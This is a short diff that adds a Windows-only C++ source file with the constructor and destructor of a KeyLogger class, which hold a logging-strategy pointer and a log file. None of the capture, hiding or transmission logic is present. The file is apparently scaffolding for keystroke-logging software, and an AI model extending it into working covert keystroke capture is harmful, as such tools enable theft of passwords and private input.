@@ -1,1 +1,22 @@
-// to be continued
+
+#ifdef _WIN32
+
+#include "../include/KeyLogger.h"
+#include <iostream>
+
+KeyLogger::KeyLogger() : 
+        logStrategy(nullptr),
+        running(false) {}
+
+KeyLogger::~KeyLogger() 
+{
+    running = false;
+    delete logStrategy;
+    
+    if (logfile.is_open())
+    {
+        logfile.close();
+    }
+}
+
+#endif
